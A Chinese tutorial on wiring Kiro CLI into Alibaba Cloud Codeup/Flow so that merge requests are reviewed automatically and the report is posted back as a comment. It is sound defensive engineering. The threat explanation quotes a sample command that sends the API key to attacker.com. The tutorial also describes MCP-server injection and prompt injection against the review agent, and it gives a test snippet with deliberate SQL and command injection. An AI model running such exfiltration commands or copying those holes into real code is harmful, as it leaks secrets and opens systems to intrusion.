# 在阿里云 Codeup 上启用 Kiro CLI 自动 MR 代码评审

> 开发者提交合并请求（MR），流水线自动调用 Kiro CLI headless 模式完成代码评审，把中文报告作为评论回写到 MR 页面——全程无人值守。本文记录在**云效 Codeup 中心站 + Flow 流水线**上从零搭建这套能力的完整过程，包括真实环境踩过的坑。

## 背景与目标

云效 Codeup 是阿里云的企业级代码托管平台，Flow 是配套的 CI/CD 流水线。Kiro 是 AWS 推出的 agentic 开发工具，其 CLI 的 **headless 模式**（`kiro-cli chat --no-interactive`）专为 CI/CD 场景设计：用 API Key 认证、传入提示词、端到端执行，无需交互终端。

本文要实现的能力：

- 开发者在 Codeup 提交/更新 MR → Flow 流水线被自动触发；
- 流水线调用 Kiro CLI 对本次变更做只读评审（可结合完整代码上下文，而非仅看 diff）；
- 评审结果以 Markdown 全局评论回写到 MR 页面；
- 评审失败**不阻塞合并**，仅流水线标红提醒（评审是辅助，最终决策在人）。

> **术语**：Codeup 的「合并请求（Merge Request，MR）」等同于 GitHub 的 Pull Request（PR）。

## 一、先理解一个关键差异：信任边界

如果你熟悉 GitHub Actions，可能会想「把 workflow YAML 和脚本直接放业务仓库不就行了」。**在 Codeup 上这样做会导致密钥泄露。**

GitHub Actions 的安全性依赖平台内建机制：fork PR 拿不到 secrets、同仓库 PR 的作者本就有写权限。而 Flow **没有对等的 secrets 保护**——MR 触发时，Flow 会 checkout **源分支**（MR 作者完全控制的代码），如果流水线执行的是源分支里的脚本，任何人提一个 MR 把脚本改成 `curl -d "$KIRO_API_KEY" https://attacker.com`，流水线就会带着私密变量执行它。

**正确做法是双代码源**：

- **业务仓库**（被评审对象）：只作为**被分析的数据**，绝不执行其中任何脚本；
- **集成包仓库**（本方案的脚本所在，固定分支/tag）：流水线执行的脚本**只来自这里**，MR 作者碰不到。

这就是为什么本方案要求把集成脚本放进一个**独立的 Codeup 仓库**，而不是塞进业务仓库。

## 二、准备工作

### 2.1 Kiro 订阅与 API Key

- Headless 模式需要 API Key，仅 **Kiro Pro / Pro+ / Pro Max / Power** 订阅可生成；若是管理员管理的组织订阅，需管理员先开启 API Key 生成权限。
- 在 kiro.dev → 账户设置 → API Keys 生成，记为 `KIRO_API_KEY`。

### 2.2 云效个人访问令牌（或专用机器人账号）

- 云效控制台 → 头像 → 个人设置 → 个人访问令牌 → 新建，勾选**代码管理（只读）+ 合并请求（读写）**。
- **生产建议**：单独建一个成员账号 `Kiro Review Bot`，头像上传 Kiro icon，用它的令牌——这样 MR 上的评审评论作者显示为这个 bot，视觉上就是「Kiro 在评论」。Codeup 没有第三方 App/Bot 平台身份能力，这是最接近的做法。

### 2.3 记下两个 ID

- **组织 ID**：藏在仓库 SSH 地址里，如 `git@codeup.aliyun.com:6a5eeddf0b23ae4786064fb3/xxx.git`，冒号后第一段就是。也可在「组织管理后台 → 基本信息」查。
- **业务库数字 ID**：进业务库 → 库设置 → 基本信息；或用 OpenAPI `ListRepositories` 查。

## 三、部署集成包仓库

在 Codeup 新建一个仓库（如 `kiro-review-kit`），放入这套集成包，结构如下：

```
kiro-review-kit/
├── scripts/
│   ├── kiro-review.sh          # 主编排：装 CLI → 隔离 → 定位 MR → diff → 评审 → 回写
│   └── lib/
│       ├── codeup-api.sh       # Codeup OpenAPI 封装（查 MR / 发评论）
│       └── diff-compress.sh    # 大 diff 优先级压缩
├── prompts/
│   └── review-prompt.md        # 评审提示词（中文、分级、密钥掩码）
├── kiro/
│   └── agent-codeup-reviewer.json  # 受信只读 custom agent
└── pipeline/
    ├── flow-pipeline.yaml       # 流水线参考配置
    └── setup-guide.md           # 配置指南
```

核心是一个纯 Bash 脚本，无重量级运行时依赖（只需 git/curl/jq/timeout）。推送到 Codeup：

```bash
git remote add codeup git@codeup.aliyun.com:<组织ID>/kiro-review-kit.git
git push codeup main
```

> 生产环境给这个仓库的 `main` 设**分支保护**——能改它的人等于能接触所有接入流水线的密钥权限。

### 只读 custom agent（安全的关键一环）

Kiro CLI 会读取工作区级的 `.kiro/settings/mcp.json`，MR 作者可借此注入恶意 MCP server 让 Kiro 执行任意命令。我们用一个专用 custom agent 关闭这个面：

```json
{
  "name": "codeup-reviewer",
  "description": "Codeup MR 自动评审专用只读 agent",
  "model": "gpt-5.6-sol",
  "prompt": "你是只读代码评审助手。只允许读取文件与搜索内容，绝不执行命令、修改文件或访问网络。",
  "tools": ["read", "grep"],
  "allowedTools": ["read", "grep"],
  "resources": [],
  "includeMcpJson": false
}
```

要点：`includeMcpJson: false` 不加载工作区 MCP 配置；`tools`/`allowedTools` 仅 `read`/`grep`；脚本运行前还会 `rm -rf 业务仓库/.kiro` 双保险。

### 选择评审模型

Headless 模式下 `/model` 斜杠命令不可用，模型在 **agent 配置的 `model` 字段**指定。上面用的是 `gpt-5.6-sol`（Kiro 已上线的 OpenAI GPT-5.6 Sol 旗舰档）。注意：模型 ID 不匹配或被组织策略限制时，Kiro 会**静默回退默认模型并打警告**，联调时要检查日志无 fallback 警告。

## 四、创建 Flow 流水线

用 **YAML 模式**建流水线最省事。核心配置（`flow-pipeline.yaml`）：

```yaml
sources:
  business_repo:                          # 业务仓库：被评审对象，不受信
    type: codeup
    name: demo-app
    endpoint: https://codeup.aliyun.com/<组织ID>/demo-app.git
    branch: master
    triggerEvents:
      - mergeRequestOpenedOrUpdate        # 关键：不配置则代码源事件不触发流水线
    certificate:
      type: serviceConnection
      serviceConnection: "<授权后自动填入>"
  integration_repo:                       # 集成包仓库：受信脚本来源，不触发
    type: codeup
    name: kiro-review-kit
    endpoint: https://codeup.aliyun.com/<组织ID>/kiro-review-kit.git
    branch: main
    certificate:
      type: serviceConnection
      serviceConnection: "<授权后自动填入>"
defaultWorkspace: business_repo
stages:
  review_stage:
    name: 代码评审
    jobs:
      kiro_review:
        name: Kiro 自动评审
        runsOn:
          group: public/cn-beijing
          container: build-steps-public-registry.cn-beijing.cr.aliyuncs.com/build-steps/alinux3:latest
        steps:
          review_step:
            step: Command
            name: 运行 Kiro 评审
            with:
              run: |
                export REVIEW_REPO_DIR="$PROJECT_DIR"
                export CI_COMMIT_REF_NAME="$CI_COMMIT_REF_NAME_1"
                export MR_TARGET_BRANCH="$CI_COMMIT_TARGET_REF_NAME_1"
                bash "$PROJECT_DIR/../integration_repo/scripts/kiro-review.sh"
```

配置要点：

1. **`triggerEvents: [mergeRequestOpenedOrUpdate]`** 必须显式声明，否则 MR 事件不会触发流水线；只在业务库配置，集成包不触发。
2. **`certificate.serviceConnection`**：代码源授权凭证 ID。首次在 YAML 编辑器里粘贴后，校验器会提示并自动识别出你组织的服务连接 ID，填入即可（无法纯 API 完成，需 UI 授权一次）。
3. **`defaultWorkspace: business_repo`** 让 `$PROJECT_DIR` 指向业务库 checkout 目录；集成包脚本用 `$PROJECT_DIR/../integration_repo` 定位（两个源是兄弟目录）。
4. **`run` 里的三行 export** 是踩坑后的产物（见第六节），把正确的源分支和目标分支喂给脚本。

### 配置私密变量

流水线保存后，进「变量与缓存」→ 字符变量，加 4 个（前两个勾选**私密模式**）：

| 变量名 | 值 | 私密 |
|---|---|---|
| `KIRO_API_KEY` | Kiro API Key | ✅ |
| `YUNXIAO_TOKEN` | 云效令牌（建议 bot 账号） | ✅ |
| `YUNXIAO_ORG_ID` | 组织 ID | |
| `CODEUP_REPO_ID` | 业务库数字 ID | |

### 开启 MR 触发

编辑业务库代码源 → 开启「代码源触发」→ 勾选「合并请求新建/更新」。Flow 会自动向 Codeup 库注册 webhook（在业务库 设置 → Webhooks 可见）。

## 五、脚本做了什么

`kiro-review.sh` 的执行流程：

1. **依赖检查**：git/curl/jq/timeout 缺一即退（`timeout` 是强制依赖，防 Kiro 挂起占死流水线）；
2. **安装/检测 kiro-cli**：云托管构建机每次运行 `curl -fsSL https://cli.kiro.dev/install | bash`（约 30 秒，生产可用自建机预装规避）；
3. **工作区隔离**：`rm -rf 业务库/.kiro` + 安装受信 custom agent 到 `~/.kiro/agents/`；
4. **定位 MR**：环境变量优先，否则用 OpenAPI 按源分支反查（同源分支多个开启的 MR 时报错要求显式指定，不静默取最新）；
5. **生成 diff**：`git merge-base` 三点比较；超 300KB 时按优先级压缩（代码 > 配置 > 文档，未直传文件以 diff chunk 索引交给 Kiro 用 read 自读）；
6. **执行评审**：`timeout` 强制限时下运行 `kiro-cli chat --no-interactive --trust-tools=read,grep --agent codeup-reviewer`；
7. **清洗与回写**：剥离 kiro-cli 输出的工具轨迹与 ANSI 色码，以 `# 代码评审报告` 为锚点截取正文，作为 GLOBAL_COMMENT 回写（HTTP 状态码判成败，仅网络/429/5xx 重试，append-only 带 `<!-- kiro-review:<sha> -->` 标记）。

评审提示词要求：中文输出、按 🔴严重/🟡警告/🔵建议 分级、引用文件路径行号、疑似密钥只掩码展示（前 4 后 4）、抗提示词注入、末尾给合并建议。

## 六、真实环境联调踩的三个坑

本地测试再充分，也覆盖不了平台接口和环境的细节。这三个问题都是在客户环境实测才暴露的：

### 坑 1：多代码源下源分支变量被污染

脚本用 `CI_COMMIT_REF_NAME` 猜源分支，但**多代码源场景下无下标内置变量取值不可预期**——它取到了集成包的 `main`，而非业务库 MR 的 `feature/xxx`，导致反查不到 MR。

实测 MR 触发时可用带下标变量：`CI_COMMIT_REF_NAME_1`（第一个源=业务库源分支）、`CI_COMMIT_TARGET_REF_NAME_1`（MR 目标分支）。解法就是流水线 `run` 里那三行 export 显式修正。

> 经验：首次接入务必先跑一次 `env | cut -d= -f1 | sort`（**只打变量名，绝不打值**——env 含私密变量且流水线日志长期保存）确认变量名，不同组织/多源顺序可能不同。

### 坑 2：回写评论接口 `resolved` 字段必填

Kiro 评审成功，但回写报 `HTTP 400 "resolved can not be null"`。中心站 `CreateChangeRequestComment` 接口的 `resolved` 字段**实际必填**，官方文档示例却标为可选。请求体补上 `resolved: false` 即通过。

### 坑 3：kiro-cli 输出混入工具轨迹与色码

headless 模式下 kiro-cli 把工具调用轨迹（`Reading directory...`）和 ANSI 颜色码一并打到 stdout，混进了评论正文；而且报告标题被加了 Markdown 引用前缀 `> `。解法：`sed` 剥离 ANSI 序列 + 以 `# 代码评审报告`（正则兼容 `> ` 前缀）为锚点截取正文。

## 七、验证效果

在业务库提一个含明显问题的 MR（**务必用合成假密钥**如 `FAKE-TEST-KEY-0000`，严禁真实凭证）：

```python
ADMIN_API_KEY = "FAKE-TEST-KEY-a1b2c3d4e5f60718"           # 硬编码凭证
rows = conn.execute("SELECT ... WHERE name LIKE '%" + keyword + "%'")  # SQL 注入
subprocess.run("ping -c 1 " + host, shell=True)             # 命令注入
app.run(host="0.0.0.0", port=8080, debug=True)              # 调试模式对外
```

约 3 分钟后（装 CLI + 模型评审），MR 页面出现 Kiro 的中文评审评论，准确识别出 4 个严重问题（SQL 注入、命令注入、硬编码凭证、调试模式），密钥掩码为 `FAKE****0718`，结论「不建议合并」。

---

## 八、进阶：与 Codeup 合并卡点及其他特性结合

前面的方案是「评论辅助、不阻塞合并」。如果你想让评审结果真正参与**门禁**，Codeup 提供了几种集成能力，可按需组合。

### 8.1 三方检查 + 提交状态（Commit Status）→ 合并卡点

Codeup 支持通过 OpenAPI 回写**提交状态**（`CreateCommitStatus`），状态有 `success` / `failure` / `pending` / `error` 四种，可带描述和跳转链接。回写后：

- 状态会展示在 MR 的「自动化检查」区；
- 在「库设置 → 分支设置 → 保护分支规则」中打开「要求合并前通过自动化执行检查」，**不满足的状态会阻止合并**。

改造思路：让 `kiro-review.sh` 除了发评论，再根据评审结论回写提交状态——例如约定「报告中出现 🔴 严重问题」则回写 `failure`，否则 `success`。这样 Kiro 就从「建议者」变成「卡点者」。

> **权衡（重要）**：AI 评审存在误报，把它设成硬卡点会阻塞正常合并，需要配套「人工豁免/重跑」机制，否则开发者会被误判卡住。建议路径：先以评论模式运行数周、观察误报率，团队建立信任后，再逐步收紧为卡点——且首期只对「硬编码密钥」这类**高精确度、低误报**的规则卡点，风格类问题永远只做建议。

### 8.2 检查运行（Check Runs）→ 更丰富的门禁展示

比提交状态更高级的是 **Check Runs**（检查运行）能力，通过 OpenAPI 管理完整生命周期，支持：

- 丰富的状态枚举（`status` + `conclusion` 两段式）；
- **检查注释（Check Annotations）**：把问题精确标注到具体文件的具体行（`startLine`/`endLine`/`startColumn`）；
- 自定义 Markdown 结果视图（`text` 字段，上限 64KB）；
- 同样可设为保护分支的合并卡点。

如果希望 Kiro 的评审结果不只是一条评论、而是像专业 CI 那样**逐行标注 + 独立检查项 + 门禁**，Check Runs 是正解。代价是要解析 Kiro 输出的结构化问题（文件+行号+严重级别），并映射到 annotation——建议让评审提示词直接输出 JSON 结构（而非当前的自由 Markdown），降低解析难度。

### 8.3 与 Codeup 内置代码检测互补

Codeup 自带代码检测服务（规范扫描、敏感信息检测、安全漏洞规则库，基于确定性规则）。它和 Kiro 是**互补而非替代**：

- **内置检测**：确定性、零误报、覆盖已知规则（如阿里巴巴 Java 规约、密钥正则）——适合做**硬卡点**；
- **Kiro 评审**：理解语义、跨文件推理、发现规则覆盖不到的逻辑/设计问题——适合做**建议 + 高危项卡点**。

推荐组合：内置检测负责「规范与已知漏洞」的硬门禁，Kiro 负责「语义级审查」的智能补充。两者的结果都汇聚在 MR 的「自动化检查」区。

### 8.4 关联工作项、评审人卡点等

- **CodeOwner 机制**：Kiro 评审可作为 CodeOwner 人工评审的前置输入——Kiro 先过一遍列出风险点，人工评审聚焦在 Kiro 标记的严重项上，提效明显；
- **关联工作项**：Kiro 评审结论可回写到 MR 关联的云效工作项，形成质量追溯；
- **多流水线编排**：Kiro 评审可作为流水线的一个 stage，与单元测试、构建、镜像扫描等串联，任一失败都反映在 MR 检查区。

### 小结：三种成熟度

| 阶段 | 集成方式 | 卡点 | 适用 |
|---|---|---|---|
| 入门（本文主线） | GLOBAL_COMMENT 评论 | 不卡 | 快速见效、建立信任 |
| 进阶 | + Commit Status 提交状态 | 高危项卡点 | 团队信任后收紧门禁 |
| 完整 | + Check Runs 逐行注释 | 独立检查项卡点 | 追求专业 CI 体验 |

从入门起步、按团队对 AI 评审的信任度逐级演进，是风险最低的落地路径。

---

## 附：本方案的安全边界（一句话）

被评审的 MR 源分支代码**全部视为不受信数据**：脚本只从独立受信仓库执行、运行前移除工作区 `.kiro/`、custom agent 关闭 MCP 加载、Kiro 仅 read/grep 只读权限、密钥全走私密变量。最坏情况下的提示词注入也只能影响评审意见（不卡合并，人工兜底），无法造成执行或泄露。
